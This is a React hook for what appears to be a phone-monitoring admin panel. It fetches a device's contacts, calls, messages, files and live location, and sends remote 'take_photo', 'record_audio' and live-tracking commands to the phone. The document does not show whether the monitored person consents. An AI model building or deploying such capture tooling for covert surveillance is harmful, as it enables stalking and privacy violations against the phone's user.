// components/admin/devices/useDeviceDetail.ts
"use client";

import { useEffect, useState, useCallback, useRef } from "react";
import { MonitoredDevice, DeviceLocation, DeviceContact, DeviceCall, DeviceMessage, DeviceFileItem } from "@/lib/device-types";
import { AudioCapture } from "@/components/admin/devices/DeviceAudioGallery";
import { createClient } from "@/lib/supabase/client";

const CACHE_TTL = 300000; // 5 minutes per Rule 12
const tabCache = new Map<string, { data: any; time: number }>();

export function useDeviceDetail(deviceId: string) {
  const [device, setDevice] = useState<MonitoredDevice | null>(null);
  const [locations, setLocations] = useState<DeviceLocation[]>([]);
  const [contacts, setContacts] = useState<DeviceContact[]>([]);
  const [calls, setCalls] = useState<DeviceCall[]>([]);
  const [messages, setMessages] = useState<DeviceMessage[]>([]);
  const [captures, setCaptures] = useState<any[]>([]);
  const [audioClips, setAudioClips] = useState<AudioCapture[]>([]);
  const [files, setFiles] = useState<DeviceFileItem[]>([]);
  const [filesLoading, setFilesLoading] = useState(false);
  const [tabLoading, setTabLoading] = useState(false);
  const [appCount, setAppCount] = useState(0);
  const [activeTab, setActiveTab] = useState("map");
  const [loading, setLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [toast, setToast] = useState<string | null>(null);
  const [isLiveMovement, setIsLiveMovement] = useState(false);
  const [locationMode, setLocationMode] = useState<"realtime" | "fetch">("realtime");

  const abortRef = useRef<AbortController | null>(null);
  const supabaseRef = useRef(createClient());

  const showToast = (msg: string) => { setToast(msg); setTimeout(() => setToast(null), 3500); };

  const fetchLightStatus = useCallback(async () => {
    if (!deviceId) return;
    try {
      const t = Date.now();
      const noStore = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" } };
      const [devRes, locRes, cmdRes] = await Promise.all([
        fetch(`/api/devices/${deviceId}?_t=${t}`, noStore).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/data?type=locations&limit=25&_t=${t}`, noStore).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/commands?_t=${t}`, noStore).then((r) => r.json()),
      ]);

      if (devRes.device) {
        setDevice(devRes.device);
        if (devRes.device.counts?.apps) setAppCount(devRes.device.counts.apps);
      }
      if (locRes.locations) setLocations(locRes.locations);
      if (cmdRes.commands) {
        setCaptures(cmdRes.commands.filter((c: any) => c.command === "take_photo" && c.result_media_path));
        setAudioClips(cmdRes.commands.filter((c: any) => c.command === "record_audio" && c.result_media_path));
      }
    } catch (err) {
      console.error("Telemetry fetch error", err);
    } finally {
      setLoading(false);
    }
  }, [deviceId]);

  const fetchTabData = useCallback(async (tab: string, bypass = false) => {
    if (!deviceId) return;

    // Cancel previous in-flight tab request
    if (abortRef.current) abortRef.current.abort();
    const controller = new AbortController();
    abortRef.current = controller;

    const cacheKey = `${deviceId}:${tab}`;
    const cached = tabCache.get(cacheKey);
    if (!bypass && cached && Date.now() - cached.time < CACHE_TTL) {
      if (tab === "contacts") setContacts(cached.data);
      else if (tab === "calls") setCalls(cached.data);
      else if (tab === "messages") setMessages(cached.data);
      else if (tab === "gallery") setFiles(cached.data);
      return;
    }

    const t = Date.now();
    const opts = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" }, signal: controller.signal };

    const load = async (type: string, limit: number, setter: (d: any) => void) => {
      if (tab === "gallery") setFilesLoading(true);
      else setTabLoading(true);
      try {
        const res = await fetch(`/api/devices/${deviceId}/data?type=${type}&limit=${limit}&_t=${t}`, opts);
        if (controller.signal.aborted) return;
        const json = await res.json();
        if (json[type]) {
          setter(json[type]);
          tabCache.set(cacheKey, { data: json[type], time: Date.now() });
        }
      } catch (e: any) {
        if (e.name !== "AbortError") console.error(e);
      } finally {
        if (tab === "gallery") setFilesLoading(false);
        else setTabLoading(false);
      }
    };

    if (tab === "contacts") await load("contacts", 10000, setContacts);
    else if (tab === "calls") await load("calls", 5000, setCalls);
    else if (tab === "messages") await load("messages", 5000, setMessages);
    else if (tab === "gallery") await load("files", 1000, setFiles);
  }, [deviceId]);

  useEffect(() => { fetchTabData(activeTab); }, [activeTab, fetchTabData]);

  const handleFullRefresh = async () => {
    setIsRefreshing(true);
    tabCache.clear();
    showToast("🔄 Refreshing all device & tab data...");
    await Promise.all([fetchLightStatus(), fetchTabData(activeTab, true)]);
    showToast("✅ Everything updated successfully!");
    setIsRefreshing(false);
  };

  // Periodic light status poll
  useEffect(() => {
    fetchLightStatus();
    const interval = setInterval(fetchLightStatus, 12000);
    return () => clearInterval(interval);
  }, [fetchLightStatus]);

  // Live location dual subscription — only active when locationMode === "realtime"
  // In "fetch" mode: zero Supabase bandwidth, update only on manual Fetch button
  useEffect(() => {
    if (!deviceId || locationMode !== "realtime") return;
    const sb = supabaseRef.current;
    const pgChannel = sb.channel(`pg-location:${deviceId}`)
      .on("postgres_changes", {
        event: "UPDATE", schema: "public", table: "monitored_devices",
        filter: `id=eq.${deviceId}`,
      }, (payload: any) => {
        const row = payload.new;
        if (row?.current_latitude && row?.current_longitude && Math.abs(row.current_latitude) > 0.001) {
          setLocations((prev) => {
            const loc = {
              id: `live-${Date.now()}`, device_id: deviceId,
              latitude: row.current_latitude, longitude: row.current_longitude,
              accuracy: row.current_accuracy || 5, speed: null, altitude: null,
              battery_level: row.battery_level, created_at: row.location_updated_at || new Date().toISOString(),
            };
            if (prev[0] && Math.abs(prev[0].latitude - loc.latitude) < 0.00001 && Math.abs(prev[0].longitude - loc.longitude) < 0.00001) return prev;
            return [loc, ...prev.slice(0, 49)];
          });
        }
      }).subscribe();
    return () => { sb.removeChannel(pgChannel); };
  }, [deviceId, locationMode]);

  // Live movement Broadcast subscription (ultra-low latency <50ms during active tracking)
  useEffect(() => {
    if (!deviceId || !isLiveMovement) return;
    const sb = supabaseRef.current;
    const channel = sb.channel(`device-live:${deviceId}`)
      .on("broadcast", { event: "location" }, (p: any) => {
        if (p.payload?.latitude && p.payload?.longitude) setLocations((prev) => [p.payload, ...prev.slice(0, 49)]);
      }).subscribe();
    return () => { sb.removeChannel(channel); };
  }, [deviceId, isLiveMovement]);

  // Realtime subscription for instant media notifications (snap, audio, file uploads)
  useEffect(() => {
    if (!deviceId) return;
    const channel = supabaseRef.current.channel(`device:${deviceId}`)
      .on("broadcast", { event: "snap_uploaded" }, () => {
        showToast("📸 New snap photo received!");
        fetchLightStatus();
      })
      .on("broadcast", { event: "audio_uploaded" }, () => {
        showToast("🎙️ New audio recording received!");
        fetchLightStatus();
      })
      .on("broadcast", { event: "file_uploaded" }, (p: any) => {
        showToast(`📁 File ready: ${p.payload?.file_name || "File uploaded"}`);
        if (activeTab === "gallery") fetchTabData("gallery", true);
      })
      .subscribe();
    return () => { supabaseRef.current.removeChannel(channel); };
  }, [deviceId, activeTab, fetchLightStatus, fetchTabData]);

  const sendCommand = async (command: string, payload = {}, label = "Command") => {
    await fetch(`/api/devices/${deviceId}/commands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command, payload }),
    });
    showToast(`${label} sent to phone!`);
    fetchLightStatus();
  };

  const handleToggleLiveMovement = (active: boolean) => {
    setIsLiveMovement(active);
    sendCommand(active ? "start_live_movement" : "stop_live_movement", {}, active ? "Live Movement ON" : "Live Movement OFF");
  };

  const deleteItem = async (entity: string, paramKey: string, id: string, label: string, filterState?: (id: string) => void) => {
    await fetch(`/api/devices/${deviceId}/data/${entity}?${paramKey}=${id}`, { method: "DELETE" });
    showToast(`${label} deleted!`);
    if (filterState) filterState(id);
    tabCache.clear();
  };

  const bulkDelete = async (entity: string, label: string, clearState?: () => void) => {
    await fetch(`/api/devices/${deviceId}/data/${entity}`, { method: "DELETE" });
    showToast(`All ${label} deleted!`);
    if (clearState) clearState();
    tabCache.clear();
  };

  return {
    device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, tabLoading, appCount,
    activeTab, setActiveTab, loading, isRefreshing, toast, isLiveMovement, locationMode, setLocationMode,
    handleFullRefresh, handleToggleLiveMovement, sendCommand,
    handleDeleteCommand: (id: string) => {
      fetch(`/api/devices/${deviceId}/commands?command_id=${id}`, { method: "DELETE" });
      showToast("Item deleted!");
      fetchLightStatus();
    },
    handleBulkDeleteCommands: (type: "take_photo" | "record_audio") => {
      const items = type === "take_photo" ? captures : audioClips;
      Promise.all(items.map((c: any) =>
        fetch(`/api/devices/${deviceId}/commands?command_id=${c.id}`, { method: "DELETE" })
      )).then(() => {
        showToast(`🗑️ All ${type === "take_photo" ? "snaps" : "audio"} deleted!`);
        if (type === "take_photo") setCaptures([]);
        else setAudioClips([]);
        fetchLightStatus();
      });
    },
    handleDeleteContact: (id: string) => deleteItem("contacts", "contact_id", id, "Contact", (cid) => setContacts(p => p.filter(c => c.id !== cid))),
    handleDeleteCall: (id: string) => deleteItem("calls", "call_id", id, "Call log", (cid) => setCalls(p => p.filter(c => c.id !== cid))),
    handleDeleteMessage: (id: string) => deleteItem("messages", "message_id", id, "Message", (mid) => setMessages(p => p.filter(m => m.id !== mid))),
    handleDeleteApp: (id: string) => deleteItem("apps", "app_id", id, "App record"),
    handleDeleteFile: async (id: string) => {
      // Also delete from storage if storage_path exists
      const file = files.find(f => f.id === id);
      if (file?.storage_path) {
        await fetch(`/api/devices/${deviceId}/data/files?file_id=${id}&storage_path=${encodeURIComponent(file.storage_path)}`, { method: "DELETE" });
      } else {
        await fetch(`/api/devices/${deviceId}/data/files?file_id=${id}`, { method: "DELETE" });
      }
      showToast("🗑️ File deleted!");
      setFiles(p => p.filter(f => f.id !== id));
      tabCache.clear();
    },
    handleBulkDeleteContacts: () => bulkDelete("contacts", "contacts", () => setContacts([])),
    handleBulkDeleteCalls: () => bulkDelete("calls", "call logs", () => setCalls([])),
    handleBulkDeleteMessages: () => bulkDelete("messages", "messages", () => setMessages([])),
    handleBulkDeleteApps: () => bulkDelete("apps", "app records"),
    handleBulkDeleteFiles: () => bulkDelete("files", "gallery files", () => setFiles([])),
  };
}
